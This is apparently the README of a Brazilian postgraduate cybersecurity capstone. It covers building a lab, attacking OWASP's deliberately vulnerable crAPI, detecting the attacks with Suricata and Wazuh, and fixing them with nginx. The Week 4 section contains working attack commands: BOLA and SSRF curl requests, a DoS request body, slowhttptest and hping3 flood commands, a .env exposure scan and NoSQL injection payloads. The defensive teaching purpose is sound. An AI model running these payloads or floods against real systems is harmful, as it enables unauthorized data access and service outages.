# 🔐 Projeto Integrador — Análise e Mitigação de Vulnerabilidades e Ameaças

**IPOG — Instituto de Pós-Graduação e Graduação**  
**Professor:** Rodrigo Muniz  
**Aluno:** Arlindo  
**Período:** Maio 2026 — Goiânia, GO

---

## 📋 Sobre o projeto

Este repositório documenta o projeto integrador de cibersegurança desenvolvido ao longo de 6 semanas. O objetivo foi construir um laboratório completo de ataque e defesa, executar explorações controladas sobre a plataforma **crAPI (OWASP)**, detectar os ataques em tempo real com ferramentas open source e propor mitigações mensuráveis.

O ciclo seguido foi:

```
Montar ambiente → Estudar vulnerabilidades → Criar regras IDS
→ Executar ataques → Detectar → Tunar alertas → Corrigir → Documentar
```

---

## 🏗️ Arquitetura do laboratório

Três máquinas virtuais em rede interna VMware (`192.168.23.0/24`):

| VM | IP | Função | Serviços |
|---|---|---|---|
| **simuaserver** | 192.168.23.128 | Monitoramento / SIEM | Wazuh Manager 4.14 + Suricata 8.0.5 |
| **labcrapi** | 192.168.23.133 | Aplicação alvo | crAPI (10 containers Docker) + Wazuh Agent + Suricata |
| **Kali Linux** | 192.168.23.134 | Plataforma de ataque | hping3, sqlmap, Nuclei, Burp Suite, slowhttptest, Python |

```
┌─────────────────────────────────────────────────────────┐
│              Rede interna 192.168.23.0/24               │
│                                                          │
│  ┌──────────┐   ataques    ┌──────────┐   alertas       │
│  │  Kali    │ ──────────→  │ labcrapi │ ──────────→     │
│  │ .134     │              │  .133    │   TCP 1514      │
│  └──────────┘              │ crAPI +  │                 │
│                            │ Suricata │  ┌──────────┐   │
│                            └──────────┘  │simuaser  │   │
│                                          │  .128    │   │
│                              eve.json →  │ Wazuh    │   │
│                                          │ Manager  │   │
│                                          └──────────┘   │
└─────────────────────────────────────────────────────────┘
```

---

## 🛠️ Ferramentas utilizadas

### Defensivas (blue team)
| Ferramenta | Versão | Papel |
|---|---|---|
| **Suricata** | 8.0.5 | IDS — análise de tráfego em tempo real, geração de alertas |
| **Wazuh** | 4.14 | SIEM — coleta, correlação e dashboard de alertas |
| **Emerging Threats** | — | 50.233 regras de detecção habilitadas no Suricata |
| **nginx** | 1.24 | Reverse proxy com rate-limit e security headers |

### Ofensivas (red team)
| Ferramenta | Papel |
|---|---|
| **Burp Suite Community** | Interceptação e manipulação de requisições HTTP |
| **hping3** | SYN Flood — DoS de camada 4 |
| **slowhttptest** | Slowloris — DoS de camada 7 |
| **sqlmap** | Fuzzing automático de injeção SQL |
| **Nuclei** | Scanner de vulnerabilidades com templates |
| **Python 3** | Script custom de fuzzing NoSQL e BOLA |
| **cURL** | Validação e reprodução de vulnerabilidades |

---

## 📅 Trajetória semana a semana

### Semana 1 — Fundação do laboratório

Provisionamos as três VMs e subimos o crAPI via Docker Compose:

```bash
LISTEN_IP="0.0.0.0" VERSION=develop \
  docker compose -f docker-compose.yml --compatibility up -d
```

O resultado foi 10 containers em execução: `crapi-identity`, `crapi-workshop`, `crapi-community`, `crapi-web`, `crapi-chatbot`, `api.mypremiumdealership.com`, `mailhog`, `chromadb`, `mongodb` (4.4) e `postgresdb` (14).

Em paralelo, instalamos o **Suricata** no `labcrapi` com logs estruturados em JSON:
```bash
# eve.json configurado em /etc/suricata/suricata.yaml
outputs:
  - eve-log:
      enabled: yes
      filename: /var/log/suricata/eve.json
```

E instalamos o **Wazuh Agent** no `labcrapi` para encaminhar os alertas ao manager:
```bash
# Configuração em /var/ossec/etc/ossec.conf
<localfile>
  <location>/var/log/suricata/eve.json</location>
  <log_format>json</log_format>
</localfile>
```

---

### Semana 2 — Regras IDS e mapeamento de vulnerabilidades

Habilitamos as **50.233 regras Emerging Threats** no Suricata e criamos 3 regras custom para os ataques específicos do crAPI:

**Arquivo:** `/etc/suricata/rules/crapi-custom.rules`

```suricata
# SID 9000001 — API1:2023 BOLA
alert http any any -> $HOME_NET 8888 (
  msg:"crAPI BOLA - Unauthorized Vehicle Access";
  flow:to_server,established;
  http.method; content:"GET";
  http.uri; content:"/identity/api/v2/vehicle/";
  content:"/location";
  sid:9000001; rev:1;
)

# SID 9000002 — API4:2023 Rate Limit Abuse
alert http any any -> $HOME_NET 8888 (
  msg:"crAPI Rate Limit Abuse - DoS Attempt";
  flow:to_server,established;
  http.method; content:"POST";
  http.uri; content:"/contact_mechanic";
  http.request_body; content:"number_of_repeats";
  threshold: type threshold, track by_src, count 1, seconds 60;
  sid:9000002; rev:3;
)

# SID 9000003 — API7:2023 SSRF
alert http any any -> $HOME_NET 8888 (
  msg:"crAPI SSRF - External URL in mechanic_api";
  flow:to_server,established;
  http.method; content:"POST";
  http.uri; content:"/contact_mechanic";
  http.request_body; content:"mechanic_api";
  sid:9000003; rev:2;
)
```

Mapeamos os desafios do crAPI para os ataques que iríamos executar:
- **BOLA/IDOR** — endpoint `/identity/api/v2/vehicle/{id}/location`
- **Rate Limit / DoS** — endpoint `/workshop/api/merchant/contact_mechanic`
- **SSRF** — parâmetro `mechanic_api` no mesmo endpoint
- **NoSQL Injection** — endpoint `/community/api/v2/coupon/validate-coupon`

---

### Semana 3 — Pipeline de ingestão de logs

Configuramos o pipeline completo de dados:

```
Tráfego de rede
    ↓
Suricata (ens33 do labcrapi)
    ↓
/var/log/suricata/eve.json
    ↓
Wazuh Agent (labcrapi) — TCP 1514
    ↓
Wazuh Manager (simuaserver)
    ↓
Dashboard Threat Hunting
```

Verificamos a conectividade com:
```bash
# No simuaserver
sudo /var/ossec/bin/agent_control -l
# labcrapi aparece como (Active)
```

---

### Semana 4 — Execução dos ataques e coleta de evidências

#### 1. BOLA — Broken Object Level Authorization

O `vehicleId` do usuário Adam foi obtido no fórum da comunidade crAPI. Com um token de outro usuário, acessamos os dados de localização dele:

```bash
curl -H "Authorization: Bearer <token_atacante>" \
  "http://192.168.23.133:8888/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location"

# Resposta HTTP 200:
# {"vehicleLocation":{"latitude":"32.778889","longitude":"-91.919243"},
#  "fullName":"Adam","email":"adam007@example.com"}
```

**Impacto:** qualquer usuário autenticado acessa dados de localização, nome e e-mail de qualquer outro usuário.

---

#### 2. SSRF — Server-Side Request Forgery

Substituímos o parâmetro `mechanic_api` por uma URL externa. O servidor crAPI buscou a URL e retornou o conteúdo para o atacante:

```bash
curl -X POST http://192.168.23.133:8888/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"mechanic_api":"https://www.google.com","repeat_request_if_failed":false,"number_of_repeats":1}'

# Resposta HTTP 200 com 2.549 bytes do HTML do Google
# {"response_from_mechanic_api":"<!doctype html><html..."}
```

**Impacto:** o servidor pode ser usado como proxy para acessar serviços internos ou externos.

---

#### 3. Rate Limit Abuse — DoS de Camada 7

Enviamos uma requisição com `repeat_request_if_failed: true` e `number_of_repeats: 1000`. O próprio crAPI confirmou o DoS:

```json
{"mechanic_api":"http://192.168.23.134/test","repeat_request_if_failed":true,"number_of_repeats":1000}

// Resposta HTTP 503:
// {"message":"Service unavailable. Seems like you caused layer 7 DoS :)"}
```

Complementamos com slowhttptest (Slowloris):
```bash
slowhttptest -c 1000 -H -g -o slowloris_report -i 10 -r 200 -t GET \
  -u http://192.168.23.133:8888 -x 24 -p 3
# Resultado: 1.000 conexões simultâneas por 43 segundos
```

---

#### 4. SYN Flood — DoS de Camada 4

```bash
sudo hping3 -S --flood -V -p 8888 192.168.23.133
# Resultado: 3.807.351 pacotes enviados → 8.515 alertas no Suricata
```

---

#### 5. Exposição de credenciais — arquivo .env

O Nuclei descobriu o arquivo de configuração exposto publicamente:

```bash
nuclei -u http://192.168.23.133:8888 \
  -t ~/.local/nuclei-templates/exposures/configs/dot-env-file.yaml

# Resultado: HTTP 200 com conteúdo do .env:
# DB_PASSWORD=crapi
# MONGO_DB_PASSWORD=crapi
```

---

#### 6. NoSQL Injection — obtenção de cupom

Script Python com operadores MongoDB como payload:

```python
nosql_payloads = [
    {"coupon_code": {"$gt": ""}},   # → HTTP 200: TRAC075 ($75)
    {"coupon_code": {"$ne": "x"}},  # → HTTP 200: TRAC075 ($75)
    {"coupon_code": {"$regex":".*"}},# → HTTP 200: TRAC075 ($75)
]
```

Resultado: cupom `TRAC075` (R$ 75,00) obtido sem conhecer o código real.

---

### Semana 5 — Dashboards e tuning no Wazuh

#### Problema identificado
O Wazuh agrupava **todos** os alertas do Suricata sob o `rule.id 86601` com nível 3 — tornando impossível identificar os ataques crAPI específicos no meio de 18.413 eventos.

#### Solução aplicada

Criamos o arquivo `/var/ossec/etc/rules/crapi_rules.xml`:

```xml
<group name="suricata,crapi,">

  <!-- BOLA: SID 9000001 → rule 100001, level 12 -->
  <rule id="100001" level="12">
    <if_sid>86601</if_sid>
    <field name="alert.signature_id">9000001</field>
    <description>crAPI BOLA - Unauthorized Vehicle Access detectado</description>
    <group>crapi_bola,gdpr_IV_35.7.d,</group>
  </rule>

  <!-- DoS: SID 9000002 → rule 100002, level 14 -->
  <rule id="100002" level="14">
    <if_sid>86601</if_sid>
    <field name="alert.signature_id">9000002</field>
    <description>crAPI Rate Limit Abuse - DoS Attempt detectado</description>
    <group>crapi_dos,dos,</group>
  </rule>

  <!-- SSRF: SID 9000003 → rule 100003, level 15 -->
  <rule id="100003" level="15">
    <if_sid>86601</if_sid>
    <field name="alert.signature_id">9000003</field>
    <description>crAPI SSRF - External URL in mechanic_api detectado</description>
    <group>crapi_ssrf,web_attack,</group>
  </rule>

</group>
```

#### Resultado do tuning

| Métrica | Antes | Depois |
|---|---|---|
| Alertas crAPI visíveis | 0 | 15 críticos |
| Level mínimo dos alertas | 3 | 12 / 14 / 15 |
| Rule IDs disponíveis | 86601 (genérico) | 100001 / 100002 / 100003 |
| Grupos no dashboard | Nenhum | crapi_bola, crapi_dos, crapi_ssrf |
| Redução de ruído | — | 99,9% (18.413 → 15) |

Para filtrar os alertas no Wazuh:
```
Threat Hunting → Events → filtro: rule.id: 100001 OR rule.id: 100002 OR rule.id: 100003
```

---

### Semana 6 — Correções, análise crítica e relatórios

#### Análise crítica da arquitetura

**Onde falhou a autenticação/autorização:**
- Endpoint `/vehicle/{id}/location` não valida se o `vehicleId` pertence ao usuário do token JWT
- Parâmetro `mechanic_api` não valida se o usuário tem permissão para apontar para URLs externas

**Onde faltou rate-limit:**
- Nenhum endpoint tinha throttling — `repeat_request_if_failed: true` com 1.000 repetições era aceito
- Sem proteção contra SYN Flood em camada 4

**Onde cabe WAF open source:**
- Na frente do Docker, ModSecurity + OWASP CRS cobriria SQLi, XSS e variantes de Log4Shell automaticamente

#### Correções aplicadas

Instalamos nginx como reverse proxy na porta 9090 com:

```nginx
# Rate-limit por IP
limit_req_zone $binary_remote_addr zone=crapi_limit:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=api_limit:10m rate=30r/m;

server {
    listen 9090;

    # Security headers
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    server_tokens off;

    # Bloqueio de arquivos sensíveis (.env, .git, etc)
    location ~* \.(env|git|bak|sql|conf|log)$ {
        deny all;
        return 403;
    }

    # Rate-limit no endpoint de DoS
    location /workshop/api/merchant/contact_mechanic {
        limit_req zone=api_limit burst=5 nodelay;
        limit_req_status 429;
        proxy_pass http://127.0.0.1:8888;
    }
}
```

**Resultado das correções:**

```bash
# ANTES — .env exposto
curl http://192.168.23.133:8888/.env
# → HTTP 200: DB_PASSWORD=crapi

# DEPOIS — .env bloqueado pelo nginx
curl http://192.168.23.133:9090/.env
# → HTTP 403 Forbidden

# DEPOIS — rate-limit ativo
# Request 1-6:  HTTP 401
# Request 7-40: HTTP 429 Too Many Requests
```

---

## 📊 KPIs — Comparativo antes e depois

| Indicador | Antes | Depois | Melhoria |
|---|---|---|---|
| Taxa de detecção BOLA/DoS/SSRF | 0% | 100% | +100% |
| MTTD (tempo até detecção) | Não mensurável | < 1 segundo | Tempo real |
| Alertas crAPI identificáveis | 0 de 18.413 | 15 distintos | +99,9% visibilidade |
| .env acessível via HTTP | HTTP 200 | HTTP 403 | Corrigido |
| Proteção DoS camada 7 | Ausente | HTTP 429 ativo | Implementado |
| Custo das correções | — | R$ 0 | 100% open source |

---

## 📁 Entregáveis neste repositório

| Arquivo | Descrição |
|---|---|
| `relatorio_tecnico_crapi.pdf` | Relatório técnico completo — 9 seções, IoCs, regras IDS, pipeline, tuning, playbook e KPIs |
| `relatorio_executivo_crapi.pdf` | Relatório executivo em linguagem de negócio — matriz de risco, impacto LGPD, plano de mitigação |
| `tabela_casos_de_teste_crapi.pdf` | 6 casos de teste documentados com endpoint, payload, IoCs e resultado obtido |

---

## 🔍 Referências

- [OWASP API Security Top 10 2023](https://owasp.org/API-Security/)
- [crAPI — Completely Ridiculous API](https://github.com/OWASP/crAPI)
- [Suricata IDS](https://suricata.io/)
- [Wazuh SIEM](https://wazuh.com/)
- [Emerging Threats Rules](https://rules.emergingthreats.net/)
- [Burp Suite Community Edition](https://portswigger.net/burp)
- [Nuclei](https://github.com/projectdiscovery/nuclei)

---

*Projeto Integrador — IPOG Pós-Graduação em Cibersegurança — Maio 2026*
